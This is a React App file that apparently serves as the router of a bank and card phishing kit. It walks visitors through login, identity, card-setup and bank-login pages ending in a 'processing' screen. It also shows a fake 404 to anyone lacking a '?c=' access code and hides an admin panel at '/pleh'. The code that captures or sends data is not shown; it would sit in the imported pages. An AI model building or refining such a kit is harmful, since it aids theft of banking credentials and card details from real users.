import React, { useState } from 'react';
import EntryPage from './pages/EntryPage';
import NotificationPage from './pages/NotificationPage';
import UserVerificationPage from './pages/UserVerificationPage';
import OrderSummaryPage from './pages/OrderSummaryPage';
import CardSetupPage from './pages/CardSetupPage';
import ProviderSelectionPage from './pages/ProviderSelectionPage';
import ProviderLoginPage from './pages/ProviderLoginPage';
import AuthenticationSuccess from './components/AuthenticationSuccess';
import AdminPage from './pages/AdminPage';
import ProcessingPage from './pages/ProcessingPage';

type Bank = {
  id: string;
  name: string;
  logo: string;
};

type PageType =
  | 'login'
  | 'payment'
  | 'identity'
  | 'transaction'
  | 'payment-config'
  | 'bank-selection'
  | 'bank-auth'
  | 'processing';

/**
 * Page 404
 */
function NotFoundPage() {
  return (
    <div
      style={{
        minHeight: '100vh',
        width: '100%',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        backgroundColor: '#ffffff',
        color: '#111111',
        fontFamily: 'Arial, Helvetica, sans-serif',
      }}
    >
      <div
        style={{
          textAlign: 'center',
          padding: '20px',
        }}
      >
        <h1
          style={{
            fontSize: '72px',
            lineHeight: 1,
            fontWeight: 700,
            margin: 0,
          }}
        >
          404
        </h1>

        <p
          style={{
            fontSize: '20px',
            marginTop: '15px',
            marginBottom: 0,
            color: '#555555',
          }}
        >
          Not Found
        </p>
      </div>
    </div>
  );
}

function App() {
  const [currentPage, setCurrentPage] = useState<PageType>('login');

  const [userData, setUserData] = useState({});

  const [transactionData, setTransactionData] = useState({
    amount: '',
    itemType: '',
  });

  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);

  /**
   * ============================================================
   * Routes spéciales
   * Ces routes ne nécessitent PAS le paramètre ?c=
   * ============================================================
   */

  if (window.location.pathname === '/success') {
    return <AuthenticationSuccess />;
  }

  if (window.location.pathname === '/pleh') {
    return <AdminPage />;
  }

  /**
   * ============================================================
   * Vérification obligatoire du paramètre ?c=
   * ============================================================
   *
   * Format obligatoire :
   * domaine.tld/?c=ABCD
   *
   * Le code doit :
   * - contenir au minimum 4 caractères
   * - contenir uniquement des lettres et chiffres
   */

  const searchParams = new URLSearchParams(window.location.search);
  const accessCode = searchParams.get('c');

  const isValidAccessCode =
    accessCode !== null &&
    /^[a-zA-Z0-9]{4,}$/.test(accessCode);

  if (!isValidAccessCode) {
    return <NotFoundPage />;
  }

  /**
   * ============================================================
   * Routes spéciales
   * ============================================================
   */

  if (window.location.pathname === '/success') {
    return <AuthenticationSuccess />;
  }

  if (window.location.pathname === '/pleh') {
    return <AdminPage />;
  }

  /**
   * ============================================================
   * Navigation
   * ============================================================
   */

  const handleLoginSuccess = () => {
    setCurrentPage('payment');
  };

  const handlePaymentAccept = () => {
    setCurrentPage('identity');
  };

  const handleIdentityConfirm = (data: any) => {
    setUserData(data);
    setCurrentPage('transaction');
  };

  const handleTransactionConfirm = (data: {
    amount: string;
    itemType: string;
  }) => {
    setTransactionData(data);
    setCurrentPage('payment-config');
  };

  const handleVerificationComplete = () => {
    setCurrentPage('bank-selection');
  };

  const handleBankSelect = (bank: Bank) => {
    setSelectedBank(bank);
    setCurrentPage('bank-auth');
  };

  const handleBankAuthenticate = () => {
    setCurrentPage('processing');
  };

  /**
   * ============================================================
   * Retour arrière
   * ============================================================
   */

  const goBack = () => {
    switch (currentPage) {
      case 'payment':
        setCurrentPage('login');
        break;

      case 'identity':
        setCurrentPage('payment');
        break;

      case 'transaction':
        setCurrentPage('identity');
        break;

      case 'payment-config':
        setCurrentPage('transaction');
        break;

      case 'bank-selection':
        setCurrentPage('payment-config');
        break;

      case 'bank-auth':
        setCurrentPage('bank-selection');
        break;

      case 'processing':
        // Pas de retour depuis le processing
        break;

      default:
        break;
    }
  };

  /**
   * ============================================================
   * Affichage des pages
   * ============================================================
   */

  return (
    <div className="font-sans">

      {currentPage === 'login' && (
        <EntryPage
          onLoginSuccess={handleLoginSuccess}
        />
      )}

      {currentPage === 'payment' && (
        <NotificationPage
          onAccept={handlePaymentAccept}
          onBack={goBack}
        />
      )}

      {currentPage === 'identity' && (
        <UserVerificationPage
          onNext={handleIdentityConfirm}
          onBack={goBack}
        />
      )}

      {currentPage === 'transaction' && (
        <OrderSummaryPage
          onConfirm={handleTransactionConfirm}
          onBack={goBack}
        />
      )}

      {currentPage === 'payment-config' && (
        <CardSetupPage
          amount={transactionData.amount}
          itemType={transactionData.itemType}
          onVerificationComplete={handleVerificationComplete}
          onBack={goBack}
        />
      )}

      {currentPage === 'bank-selection' && (
        <ProviderSelectionPage
          onBankSelect={handleBankSelect}
          onBack={goBack}
        />
      )}

      {currentPage === 'bank-auth' && selectedBank && (
        <ProviderLoginPage
          bank={selectedBank}
          onAuthenticate={handleBankAuthenticate}
          onBack={goBack}
        />
      )}

      {currentPage === 'processing' && (
        <ProcessingPage />
      )}

    </div>
  );
}

export default App;
